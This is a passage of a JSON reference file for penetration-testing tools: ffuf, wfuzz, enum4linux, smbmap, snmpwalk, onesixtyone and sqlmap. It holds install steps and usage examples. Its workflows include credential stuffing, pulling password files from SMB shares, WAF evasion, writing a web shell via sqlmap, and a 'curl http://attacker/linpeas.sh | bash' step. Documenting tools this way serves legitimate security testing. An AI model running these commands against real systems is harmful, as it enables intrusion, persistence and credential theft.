            "command": "feroxbuster -u https://example.com -w raft-large.txt --depth 4"
          },
          {
            "label": "Manual testing",
            "description": "Review findings and test manually.",
            "command": "curl -v https://example.com/api/v1/users"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "/admin (Status: 302) [Size: 0] [--> /login]",
        "meaning": "Found redirect; follow to discover auth page.",
        "severity": "info"
      },
      {
        "indicator": "/api/v1 (Status: 200) [Size: 1234]",
        "meaning": "API endpoint discovered; test for documentation or open endpoints.",
        "severity": "warning"
      }
    ],
    "advanced_usage": [
      {
        "title": "Multi-extension fuzzing with rate limiting",
        "command": "gobuster dir -u https://example.com -w wordlist.txt -x php,html,txt,bak -t 50 --delay 100ms -o results.txt",
        "scenario": "Test for files with multiple extensions while controlling request rate.",
        "notes": [
          "Use -b to exclude specific status codes like 404,403."
        ]
      }
    ],
    "comparison_table": null,
    "resources": []
  },
  {
    "id": "ffuf",
    "name": "ffuf",
    "summary": "ffuf (Fuzz Faster U Fool) is a blazing fast web fuzzer for discovering files, directories, parameters, and virtual hosts. It supports advanced filters to quickly isolate meaningful responses.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": null,
        "steps": [
          {
            "detail": "sudo apt install -y golang",
            "copyable": true
          },
          {
            "detail": "go install github.com/ffuf/ffuf/v2@latest",
            "copyable": true
          },
          {
            "detail": "export PATH=$PATH:~/go/bin",
            "copyable": true
          },
          {
            "detail": "ffuf -V",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Pre-installed or via apt",
        "steps": [
          {
            "detail": "sudo apt install -y ffuf",
            "copyable": true
          },
          {
            "detail": "ffuf -h",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": null,
        "steps": [
          {
            "detail": "docker pull ffuf/ffuf",
            "copyable": true
          },
          {
            "detail": "docker run --rm ffuf/ffuf -u http://example.com/FUZZ -w /wordlist.txt",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Directory fuzzing",
        "command": "ffuf -w data/wordlists/common.txt -u https://target/FUZZ",
        "notes": []
      },
      {
        "description": "Parameter fuzzing",
        "command": "ffuf -w params.txt -u 'https://target/search?FUZZ=test'",
        "notes": []
      },
      {
        "description": "Find virtual hosts",
        "command": "ffuf -w subdomains.txt -u http://target/ -H 'Host: FUZZ.target'",
        "notes": []
      },
      {
        "description": "Filter by response size",
        "command": "ffuf -w common.txt -u https://target/FUZZ -fs 0",
        "notes": []
      },
      {
        "description": "Recursive fuzzing",
        "command": "ffuf -w common.txt -u https://target/FUZZ -recursion -recursion-depth 2",
        "notes": []
      }
    ],
    "common_flags": [
      {
        "flag": "-w <wordlist>",
        "description": "Wordlist path"
      },
      {
        "flag": "-u <url>",
        "description": "Target URL (use FUZZ keyword)"
      },
      {
        "flag": "-H/-b",
        "description": "Inject headers or cookies"
      },
      {
        "flag": "-recursion",
        "description": "Automatically revisit discovered paths"
      },
      {
        "flag": "-mc/-fc",
        "description": "Filter by match or filter status codes"
      },
      {
        "flag": "-fs/-fw",
        "description": "Filter by size (bytes) or words"
      },
      {
        "flag": "-t/-p",
        "description": "Threads (-t) and delay (-p)"
      },
      {
        "flag": "-o <file>",
        "description": "Write JSON output"
      }
    ],
    "operational_tips": [
      "Mark every location to fuzz with FUZZ (URL paths, headers, POST data).",
      "Use -ic to ignore wordlist comments when using SecLists.",
      "Stack filters (e.g., -mc 200 -fs 0) to hide noise quickly.",
      "Throttle threads (-t) for fragile targets or WAFs.",
      "Store results (-o output.json) for later analysis or reporting."
    ],
    "step_sequences": [
      {
        "title": "Fast web fuzzing",
        "steps": [
          {
            "title": "Directory fuzzing",
            "details": "Discover hidden paths.",
            "command": "ffuf -u http://example.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt"
          },
          {
            "title": "Parameter fuzzing",
            "details": "Test for hidden GET parameters.",
            "command": "ffuf -u http://example.com/api?FUZZ=test -w params.txt"
          },
          {
            "title": "Virtual host fuzzing",
            "details": "Find vhosts with Host header manipulation.",
            "command": "ffuf -u http://example.com -H 'Host: FUZZ.example.com' -w subdomains.txt -fs 1234"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "ffuf \u2192 Filter tuning \u2192 Export",
        "stages": [
          {
            "label": "Initial fuzzing",
            "description": "Run basic directory scan.",
            "command": "ffuf -u https://example.com/FUZZ -w common.txt -mc 200,301,302"
          },
          {
            "label": "Filter false positives",
            "description": "Exclude by size or word count.",
            "command": "ffuf -u https://example.com/FUZZ -w wordlist.txt -fs 4242 -fw 100"
          },
          {
            "label": "Export for reporting",
            "description": "Save results in JSON.",
            "command": "ffuf -u https://example.com/FUZZ -w wordlist.txt -o results.json -of json"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "[Status: 200, Size: 1234, Words: 56, Lines: 42]",
        "meaning": "Successful response with content metrics.",
        "severity": "info"
      },
      {
        "indicator": "admin [Status: 301, Size: 0]",
        "meaning": "Redirect found; potential admin interface.",
        "severity": "warning"
      }
    ],
    "advanced_usage": [
      {
        "title": "Multi-stage fuzzing with recursion",
        "command": "ffuf -u https://example.com/FUZZ -w dirs.txt -recursion -recursion-depth 2 -e .php,.html -v",
        "scenario": "Automatically fuzz discovered directories with extensions.",
        "notes": [
          "Use -rate to limit requests per second for IDS evasion."
        ]
      }
    ],
    "comparison_table": null,
    "resources": []
  },
  {
    "id": "wfuzz",
    "name": "Wfuzz",
    "summary": "Wfuzz is a web application fuzzer used to brute force GET/POST parameters, analyze responses, and find hidden resources.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": null,
        "steps": [
          {
            "detail": "sudo apt update",
            "copyable": true
          },
          {
            "detail": "sudo apt install -y wfuzz",
            "copyable": true
          },
          {
            "detail": "wfuzz -h",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Pre-installed",
        "steps": [
          {
            "detail": "wfuzz --version",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": null,
        "steps": [
          {
            "detail": "pip3 install wfuzz",
            "copyable": true
          },
          {
            "detail": "wfuzz -h",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Basic directory fuzzing",
        "command": "wfuzz -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt https://example.com/FUZZ",
        "notes": []
      },
      {
        "description": "Parameter fuzzing",
        "command": "wfuzz -w wordlist.txt -z range,1-100 --hc 404 https://example.com/search.php?id=FUZZ",
        "notes": []
      },
      {
        "description": "POST form fuzzing",
        "command": "wfuzz -w users.txt -w passwords.txt -d 'user=FUZZ&pass=FUZ2Z' https://example.com/login.php",
        "notes": []
      },
      {
        "description": "Virtual host enumeration",
        "command": "wfuzz -w subdomains.txt -H 'Host: FUZZ.example.com' https://example.com",
        "notes": []
      }
    ],
    "common_flags": [
      {
        "flag": "-w",
        "description": "Wordlist file"
      },
      {
        "flag": "-z",
        "description": "Payload generator"
      },
      {
        "flag": "-d",
        "description": "POST data"
      },
      {
        "flag": "-H",
        "description": "Custom headers"
      },
      {
        "flag": "--hc",
        "description": "Hide response codes"
      },
      {
        "flag": "--hl",
        "description": "Hide response lines"
      },
      {
        "flag": "--hw",
        "description": "Hide response words"
      }
    ],
    "operational_tips": [
      "Use filters (--hc, --hl, --hw) to reduce noise.",
      "Combine multiple wordlists for complex attacks.",
      "Save interesting results for manual testing.",
      "Use POST data for form and API testing."
    ],
    "step_sequences": [
      {
        "title": "Web application fuzzing",
        "steps": [
          {
            "title": "Basic directory fuzzing",
            "details": "Discover web paths.",
            "command": "wfuzz -w /usr/share/seclists/Discovery/Web-Content/common.txt http://example.com/FUZZ"
          },
          {
            "title": "Parameter fuzzing",
            "details": "Test for hidden parameters.",
            "command": "wfuzz -w params.txt -u http://example.com/search?FUZZ=test"
          },
          {
            "title": "POST data fuzzing",
            "details": "Fuzz form parameters.",
            "command": "wfuzz -w usernames.txt -w passwords.txt -d 'user=FUZZ&pass=FUZ2Z' http://example.com/login"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "Wfuzz \u2192 Response analysis \u2192 SQLi testing",
        "stages": [
          {
            "label": "Parameter discovery",
            "description": "Find all query parameters.",
            "command": "wfuzz -w params.txt http://example.com/?FUZZ=1 --hc 404"
          },
          {
            "label": "Response differentiation",
            "description": "Identify parameters that change behavior.",
            "command": "wfuzz -w params.txt http://example.com/?FUZZ=1 --hh 1234"
          },
          {
            "label": "SQLi probing",
            "description": "Test discovered parameters for SQL injection.",
            "command": "sqlmap -u 'http://example.com/?id=1' --batch --level 3"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "000000042:   200        56 L     123 W    1234 Ch",
        "meaning": "Response with HTTP 200, 56 lines, 123 words, 1234 characters.",
        "severity": "info"
      },
      {
        "indicator": "admin",
        "meaning": "Potential admin path found; verify manually.",
        "severity": "warning"
      }
    ],
    "advanced_usage": [
      {
        "title": "Multi-position fuzzing with filters",
        "command": "wfuzz -w users.txt -w passes.txt -d 'username=FUZZ&password=FUZ2Z' --hc 401,403 http://example.com/login",
        "scenario": "Simultaneously fuzz multiple positions and filter by status codes.",
        "notes": [
          "Use --sc 200 to show only successful responses."
        ]
      }
    ],
    "comparison_table": null,
    "resources": []
  },
  {
    "id": "enum4linux",
    "name": "Enum4linux",
    "summary": "Enum4linux is a tool for enumerating information from Windows and Samba systems, similar to enum.exe but for Linux.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": null,
        "steps": [
          {
            "detail": "sudo apt update",
            "copyable": true
          },
          {
            "detail": "sudo apt install -y enum4linux",
            "copyable": true
          },
          {
            "detail": "enum4linux -h",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Pre-installed",
        "steps": [
          {
            "detail": "enum4linux -a 192.168.1.10",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": null,
        "steps": [
          {
            "detail": "git clone https://github.com/CiscoCXSecurity/enum4linux",
            "copyable": true
          },
          {
            "detail": "cd enum4linux",
            "copyable": true
          },
          {
            "detail": "chmod +x enum4linux.pl",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Full enumeration",
        "command": "enum4linux -a 192.168.1.100",
        "notes": []
      },
      {
        "description": "Share enumeration",
        "command": "enum4linux -S 192.168.1.100",
        "notes": []
      },
      {
        "description": "User enumeration",
        "command": "enum4linux -U 192.168.1.100",
        "notes": []
      },
      {
        "description": "OS and workgroup information",
        "command": "enum4linux -o 192.168.1.100",
        "notes": []
      }
    ],
    "common_flags": [
      {
        "flag": "-a",
        "description": "All enumeration options"
      },
      {
        "flag": "-U",
        "description": "Get userlist"
      },
      {
        "flag": "-S",
        "description": "Share enumeration"
      },
      {
        "flag": "-P",
        "description": "Password policy"
      },
      {
        "flag": "-o",
        "description": "OS information"
      },
      {
        "flag": "-g",
        "description": "Group and member list"
      },
      {
        "flag": "-r",
        "description": "RID cycling"
      }
    ],
    "operational_tips": [
      "Always try full enumeration first for maximum information.",
      "Use results to identify weak configurations and users.",
      "Document share information for potential access paths.",
      "Combine with SMB exploitation tools for follow-up testing."
    ],
    "step_sequences": [
      {
        "title": "SMB/Windows enumeration",
        "steps": [
          {
            "title": "Full enumeration",
            "details": "Run all enum4linux checks.",
            "command": "enum4linux -a 192.168.1.10"
          },
          {
            "title": "User enumeration",
            "details": "List users on Windows target.",
            "command": "enum4linux -U 192.168.1.10"
          },
          {
            "title": "Share enumeration",
            "details": "Discover SMB shares.",
            "command": "enum4linux -S 192.168.1.10"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "Enum4linux \u2192 SMBMap \u2192 Credential testing",
        "stages": [
          {
            "label": "Initial SMB recon",
            "description": "Discover shares and users.",
            "command": "enum4linux -a 192.168.1.10 | tee enum4linux.txt"
          },
          {
            "label": "Share mapping",
            "description": "List accessible shares.",
            "command": "smbmap -H 192.168.1.10"
          },
          {
            "label": "Credential stuffing",
            "description": "Test common credentials.",
            "command": "crackmapexec smb 192.168.1.10 -u users.txt -p passwords.txt"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "[+] Got domain/workgroup name: WORKGROUP",
        "meaning": "Target is part of a workgroup, not a domain.",
        "severity": "info"
      },
      {
        "indicator": "user:[admin] rid:[0x1f4]",
        "meaning": "User account discovered with RID.",
        "severity": "info"
      }
    ],
    "advanced_usage": [
      {
        "title": "Authenticated enumeration",
        "command": "enum4linux -u 'admin' -p 'Password123' -a 192.168.1.10",
        "scenario": "Use known credentials for deeper enumeration.",
        "notes": [
          "Combine with enum4linux-ng for improved parsing and JSON output."
        ]
      }
    ],
    "comparison_table": null,
    "resources": []
  },
  {
    "id": "smbmap",
    "name": "SMBMap",
    "summary": "SMBMap allows users to enumerate samba share drives across an entire domain. Useful for identifying sensitive shares.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": null,
        "steps": [
          {
            "detail": "sudo apt update",
            "copyable": true
          },
          {
            "detail": "sudo apt install -y smbmap",
            "copyable": true
          },
          {
            "detail": "smbmap -h",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Pre-installed",
        "steps": [
          {
            "detail": "smbmap -H 192.168.1.10",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": null,
        "steps": [
          {
            "detail": "git clone https://github.com/ShawnDEvans/smbmap",
            "copyable": true
          },
          {
            "detail": "cd smbmap",
            "copyable": true
          },
          {
            "detail": "pip3 install -r requirements.txt",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Basic share enumeration",
        "command": "smbmap -H 192.168.1.100",
        "notes": []
      },
      {
        "description": "List shares with permissions",
        "command": "smbmap -H 192.168.1.100 -R",
        "notes": []
      },
      {
        "description": "Download files from share",
        "command": "smbmap -H 192.168.1.100 -u guest -p '' -R 'share_name' --download 'path/to/file'",
        "notes": []
      },
      {
        "description": "Upload file to share",
        "command": "smbmap -H 192.168.1.100 -u user -p pass -R 'share_name' --upload '/local/file.txt' 'remote/path'",
        "notes": []
      }
    ],
    "common_flags": [
      {
        "flag": "-H",
        "description": "Target host"
      },
      {
        "flag": "-u",
        "description": "Username"
      },
      {
        "flag": "-p",
        "description": "Password"
      },
      {
        "flag": "-R",
        "description": "Recursively list directories"
      },
      {
        "flag": "--download",
        "description": "Download file"
      },
      {
        "flag": "--upload",
        "description": "Upload file"
      },
      {
        "flag": "-x",
        "description": "Execute command"
      }
    ],
    "operational_tips": [
      "Try null session authentication for anonymous access.",
      "Look for sensitive files in readable shares.",
      "Document permissions for potential privilege escalation.",
      "Be careful with file operations to avoid detection."
    ],
    "step_sequences": [
      {
        "title": "SMB share enumeration",
        "steps": [
          {
            "title": "Anonymous share listing",
            "details": "List shares without credentials.",
            "command": "smbmap -H 192.168.1.10"
          },
          {
            "title": "Authenticated enumeration",
            "details": "Use credentials to list shares and permissions.",
            "command": "smbmap -H 192.168.1.10 -u admin -p Password123"
          },
          {
            "title": "Recursive file listing",
            "details": "List all files in accessible shares.",
            "command": "smbmap -H 192.168.1.10 -u admin -p Password123 -R"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "SMBMap \u2192 Download sensitive files \u2192 Credential extraction",
        "stages": [
          {
            "label": "Share discovery",
            "description": "Identify readable shares.",
            "command": "smbmap -H 192.168.1.10 -u guest -p '' > shares.txt"
          },
          {
            "label": "Interesting files",
            "description": "Search for sensitive data.",
            "command": "smbmap -H 192.168.1.10 -u admin -p pass -R --exclude ADMIN$ C$ -A '.*password.*'"
          },
          {
            "label": "Download and analyze",
            "description": "Pull files for offline analysis.",
            "command": "smbmap -H 192.168.1.10 -u admin -p pass --download 'Data\\passwords.txt'"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "[+] Finding open SMB ports....",
        "meaning": "SMBMap is testing SMB connectivity.",
        "severity": "info"
      },
      {
        "indicator": "READ, WRITE: \\\\192.168.1.10\\Data",
        "meaning": "Share with read/write access found.",
        "severity": "warning"
      }
    ],
    "advanced_usage": [
      {
        "title": "Command execution via SMB",
        "command": "smbmap -H 192.168.1.10 -u admin -p Password123 -x 'ipconfig /all'",
        "scenario": "Execute remote commands on Windows host via SMB.",
        "notes": [
          "Use -L to list drives, -r to browse specific shares."
        ]
      }
    ],
    "comparison_table": null,
    "resources": []
  },
  {
    "id": "snmpwalk",
    "name": "SNMPwalk",
    "summary": "SNMPwalk is an SNMP application that uses SNMP GETNEXT requests to query a network entity for a tree of information.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": null,
        "steps": [
          {
            "detail": "sudo apt update",
            "copyable": true
          },
          {
            "detail": "sudo apt install -y snmp snmp-mibs-downloader",
            "copyable": true
          },
          {
            "detail": "sudo download-mibs",
            "copyable": true
          },
          {
            "detail": "snmpwalk -v2c -c public 192.168.1.1",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Pre-installed",
        "steps": [
          {
            "detail": "snmpwalk -v2c -c public 192.168.1.1",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": null,
        "steps": [
          {
            "detail": "docker run --rm kalilinux/kali-rolling snmpwalk -v2c -c public 192.168.1.1",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Basic SNMP walk",
        "command": "snmpwalk -v2c -c public 192.168.1.1",
        "notes": []
      },
      {
        "description": "Walk specific OID tree",
        "command": "snmpwalk -v2c -c public 192.168.1.1 1.3.6.1.2.1.1",
        "notes": []
      },
      {
        "description": "Verbose output with retries",
        "command": "snmpwalk -v2c -c public -v -r 3 192.168.1.1",
        "notes": []
      },
      {
        "description": "Walk all OIDs",
        "command": "snmpwalk -v2c -c public 192.168.1.1 .1",
        "notes": []
      }
    ],
    "common_flags": [
      {
        "flag": "-v",
        "description": "SNMP version (1, 2c, 3)"
      },
      {
        "flag": "-c",
        "description": "Community string"
      },
      {
        "flag": "-r",
        "description": "Number of retries"
      },
      {
        "flag": "-t",
        "description": "Timeout in seconds"
      },
      {
        "flag": "-m",
        "description": "Load MIB modules"
      },
      {
        "flag": "-On",
        "description": "Print OIDs numerically"
      },
      {
        "flag": "-Os",
        "description": "Print only last symbolic part"
      }
    ],
    "operational_tips": [
      "Try common community strings like 'public', 'private', 'cisco'.",
      "Use version 1 for older devices, 2c for modern ones.",
      "Save output for analysis of device configuration.",
      "Combine with SNMP brute force tools for discovery."
    ],
    "step_sequences": [
      {
        "title": "SNMP enumeration",
        "steps": [
          {
            "title": "Basic walk",
            "details": "Query all SNMP data with default community string.",
            "command": "snmpwalk -v2c -c public 192.168.1.1"
          },
          {
            "title": "Specific OID",
            "details": "Query system information.",
            "command": "snmpwalk -v2c -c public 192.168.1.1 1.3.6.1.2.1.1"
          },
          {
            "title": "Save output",
            "details": "Redirect results to file.",
            "command": "snmpwalk -v2c -c public 192.168.1.1 > snmpwalk.txt"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "Onesixtyone \u2192 SNMPwalk \u2192 Analysis",
        "stages": [
          {
            "label": "Community string discovery",
            "description": "Brute force SNMP community strings.",
            "command": "onesixtyone -c community.txt 192.168.1.0/24"
          },
          {
            "label": "Full SNMP walk",
            "description": "Extract all SNMP data with discovered strings.",
            "command": "snmpwalk -v2c -c private 192.168.1.1 > snmp_data.txt"
          },
          {
            "label": "Parse sensitive info",
            "description": "Extract usernames, processes, network config.",
            "command": "grep -i 'user\\|pass\\|config' snmp_data.txt"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "SNMPv2-MIB::sysDescr.0 = STRING: Cisco IOS",
        "meaning": "System description reveals device type and OS.",
        "severity": "info"
      },
      {
        "indicator": "IF-MIB::ifDescr.1 = STRING: Ethernet0/0",
        "meaning": "Network interface enumeration.",
        "severity": "info"
      }
    ],
    "advanced_usage": [
      {
        "title": "SNMPv3 with authentication",
        "command": "snmpwalk -v3 -u admin -l authPriv -a SHA -A authpass -x AES -X privpass 192.168.1.1",
        "scenario": "Query SNMP with v3 authentication and encryption.",
        "notes": [
          "Use snmp-check for automated parsing and reporting."
        ]
      }
    ],
    "comparison_table": null,
    "resources": []
  },
  {
    "id": "onesixtyone",
    "name": "Onesixtyone",
    "summary": "Onesixtyone is an SNMP scanner that sends SNMP requests to multiple IP addresses, trying different community strings.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": null,
        "steps": [
          {
            "detail": "sudo apt update",
            "copyable": true
          },
          {
            "detail": "sudo apt install -y onesixtyone",
            "copyable": true
          },
          {
            "detail": "onesixtyone -h",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Pre-installed",
        "steps": [
          {
            "detail": "onesixtyone 192.168.1.1",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": null,
        "steps": [
          {
            "detail": "git clone https://github.com/trailofbits/onesixtyone",
            "copyable": true
          },
          {
            "detail": "cd onesixtyone",
            "copyable": true
          },
          {
            "detail": "make",
            "copyable": true
          },
          {
            "detail": "sudo make install",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Basic SNMP scan",
        "command": "onesixtyone 192.168.1.1",
        "notes": []
      },
      {
        "description": "Scan with custom community strings",
        "command": "onesixtyone -c community.txt 192.168.1.0/24",
        "notes": []
      },
      {
        "description": "Fast scan with output file",
        "command": "onesixtyone -o results.txt -w wordlist.txt 192.168.1.0/24",
        "notes": []
      },
      {
        "description": "Verbose scanning",
        "command": "onesixtyone -v -d 192.168.1.1",
        "notes": []
      }
    ],
    "common_flags": [
      {
        "flag": "-c",
        "description": "Community strings file"
      },
      {
        "flag": "-o",
        "description": "Output file"
      },
      {
        "flag": "-w",
        "description": "Wordlist file"
      },
      {
        "flag": "-v",
        "description": "Verbose mode"
      },
      {
        "flag": "-d",
        "description": "Debug mode"
      },
      {
        "flag": "-i",
        "description": "Input file with hosts"
      }
    ],
    "operational_tips": [
      "Use comprehensive community string wordlists.",
      "Scan in batches to avoid overwhelming networks.",
      "Save results for follow-up SNMP enumeration.",
      "Combine with detailed SNMPwalk on discovered devices."
    ],
    "step_sequences": [
      {
        "title": "SNMP community string bruteforce",
        "steps": [
          {
            "title": "Single target",
            "details": "Test common community strings.",
            "command": "onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt 192.168.1.1"
          },
          {
            "title": "Subnet scan",
            "details": "Sweep entire network.",
            "command": "onesixtyone -c community.txt -i targets.txt"
          },
          {
            "title": "Save results",
            "details": "Output to file.",
            "command": "onesixtyone -c community.txt 192.168.1.0/24 -o snmp_results.txt"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "Onesixtyone \u2192 SNMPwalk \u2192 Privilege escalation",
        "stages": [
          {
            "label": "Discover community strings",
            "description": "Brute force SNMP access.",
            "command": "onesixtyone -c dict.txt 192.168.1.0/24 > communities.txt"
          },
          {
            "label": "SNMP enumeration",
            "description": "Extract configuration data.",
            "command": "snmpwalk -v2c -c private 192.168.1.1 > snmp_full.txt"
          },
          {
            "label": "Extract credentials",
            "description": "Find cleartext passwords in SNMP data.",
            "command": "grep -i 'password' snmp_full.txt"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "192.168.1.1 [public] Hardware: x86_64",
        "meaning": "Valid community string found with system info.",
        "severity": "warning"
      },
      {
        "indicator": "Scanning 256 hosts, 2 communities",
        "meaning": "Onesixtyone is testing community strings across range.",
        "severity": "info"
      }
    ],
    "advanced_usage": [
      {
        "title": "Fast sweep with custom wordlist",
        "command": "onesixtyone -c custom_communities.txt -i targets.txt -w 10",
        "scenario": "Increase wait time for slower networks or devices.",
        "notes": [
          "Combine with Nmap SNMP scripts for comprehensive enumeration."
        ]
      }
    ],
    "comparison_table": null,
    "resources": []
  },
  {
    "id": "sqlmap",
    "name": "sqlmap",
    "summary": "sqlmap automates the detection and exploitation of SQL injection flaws, supporting numerous DBMS engines and shell payloads.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": "Install the apt package and prepare working folders for captured requests and sqlmap output.",
        "steps": [
          {
            "detail": "sudo apt update",
            "copyable": true
          },
          {
            "detail": "sudo apt install -y sqlmap python3-pip seclists",
            "copyable": true
          },
          {
            "detail": "mkdir -p ~/.config/sqlmap/output && sqlmap --wizard",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Kali ships sqlmap; keep tamper scripts and wordlists synchronized with the rolling release.",
        "steps": [
          {
            "detail": "sudo apt update && sudo apt install -y sqlmap seclists",
            "copyable": true
          },
          {
            "detail": "rsync -a /usr/share/sqlmap/tamper ~/.config/sqlmap/tamper",
            "copyable": true
          },
          {
            "detail": "sqlmap --list-tampers | head",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": "Run sqlmap from the official container when the host Python environment is locked down.",
        "steps": [
          {
            "detail": "docker pull sqlmapproject/sqlmap",
            "copyable": true
          },
          {
            "detail": "docker run --rm -v $(pwd)/request.txt:/tmp/request.txt -v $(pwd)/output:/root/.sqlmap/output sqlmapproject/sqlmap -r /tmp/request.txt --batch",
            "copyable": true
          },
          {
            "detail": "ls output",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Basic GET parameter test",
        "command": "python3 sqlmap.py -u 'https://target/item.php?id=1' --batch",
        "notes": []
      },
      {
        "description": "Use captured request file",
        "command": "python3 sqlmap.py -r request.txt --level 3 --risk 2",
        "notes": []
      },
      {
        "description": "Enumerate databases",
        "command": "python3 sqlmap.py -u 'https://target/item.php?id=1' --dbs",
        "notes": []
      },
      {
        "description": "Dump a table",
        "command": "python3 sqlmap.py -u 'https://target/item.php?id=1' -D appdb -T users --dump",
        "notes": []
      },
      {
        "description": "Obtain OS shell",
        "command": "python3 sqlmap.py -u 'https://target/item.php?id=1' --os-shell",
        "notes": []
      }
    ],
    "common_flags": [
      {
        "flag": "-u/-r",
        "description": "Direct URL (-u) or request file (-r)"
      },
      {
        "flag": "--level/--risk",
        "description": "Depth of tests (1-5) and impact"
      },
      {
        "flag": "--batch",
        "description": "Auto-confirm prompts"
      },
      {
        "flag": "--dbs/-D/-T/-C",
        "description": "Enumerate DBs, tables, columns"
      },
      {
        "flag": "--dump",
        "description": "Dump selected data"
      },
      {
        "flag": "--os-shell/--sql-shell",
        "description": "Spawn command or SQL shells"
      },
      {
        "flag": "--tamper",
        "description": "Apply tamper scripts (evasion)"
      },
      {
        "flag": "--random-agent",
        "description": "Randomize User-Agent"
      }
    ],
    "operational_tips": [
      "Capture complex requests with Burp/ZAP and feed them via -r.",
      "Use lower --risk/--level on fragile production targets.",
      "Always document data extracted and clean up any uploaded shells.",
      "Tamper scripts can bypass WAF/IDS filters; try between attempts."
    ],
    "step_sequences": [
      {
        "title": "Tamper-guided SQL injection workflow",
        "steps": [
          {
            "title": "Capture reproducible request",
            "details": "Use Burp or ZAP to export the vulnerable request for -r usage and keep volatile headers constant.",
            "command": "cp ~/burp/request.txt ./request.txt"
          },
          {
            "title": "Baseline low-noise test",
            "details": "Confirm the parameter is injectable with conservative level/risk values.",
            "command": "sqlmap -r request.txt -p id --risk=1 --level=1 --batch --flush-session"
          },
          {
            "title": "Escalate with tamper scripts",
            "details": "Chain tamper scripts when a WAF blocks obvious payloads.",
            "command": "sqlmap -r request.txt -p id --risk=3 --level=5 --tamper=space2comment,randomcase --threads=10"
          },
          {
            "title": "Extract scoped data",
            "details": "Dump only the in-scope table and filter for the accounts you need.",
            "command": "sqlmap -r request.txt -D appdb -T users --dump --where=\"role='admin'\""
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "SQL injection to persistence chain",
        "stages": [
          {
            "label": "sqlmap enumeration",
            "description": "Fingerprint DBMS, privileges, and current user before dumping data.",
            "command": "sqlmap -r request.txt --banner --current-user --is-dba --dbs"
          },
          {
            "label": "Drop web shell (Weevely)",
            "description": "Abuse file-write to place an agent for persistent access.",
            "command": "sqlmap -r request.txt --file-write shell.php --file-dest /var/www/html/cache.php"
          },
          {
            "label": "Post-exploitation survey",
            "description": "Use LinPEAS or WinPEAS from the new foothold to map escalation paths.",
            "command": "curl http://attacker/linpeas.sh | bash"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "[WARNING] heuristic (basic) test shows that GET parameter 'id' might be injectable",
        "meaning": "sqlmap confirmed the parameter is worth targeting; continue with higher risk levels once scope is approved.",
        "severity": "medium"
      },
      {
        "indicator": "[INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'",
        "meaning": "The tool cycles through different techniques; note which ones succeed for reporting and manual exploitation.",
        "severity": "info"
      },
      {
        "indicator": "[INFO] fetched data logged to text files under 'output/example.com'",
        "meaning": "All dumped data is stored locally; archive the folder as engagement evidence.",
        "severity": "info"
      },
      {
        "indicator": "[CRITICAL] connection timed out to the target URL",
        "meaning": "The target stopped responding; reduce thread count or verify that your IP is not blocked.",
        "severity": "warning"
      }
    ],
    "advanced_usage": [
      {
        "title": "Stacked query exploitation through a proxy",
        "scenario": "Use when outbound traffic must traverse a corporate proxy and WAF evasion is required.",
        "command": "sqlmap -r request.txt -p id --risk=3 --level=5 --random-agent --tamper=between --technique=BEUST --proxy='http://127.0.0.1:8080' --batch",
        "notes": [
          "Combine with --fresh-queries after tuning payloads so cached responses do not mask results.",
          "Document all tamper scripts used for reproducibility."
        ]
      }
    ],
    "comparison_table": null,
    "resources": [
      {
        "label": "sqlmap wiki",
        "url": "https://github.com/sqlmapproject/sqlmap/wiki",
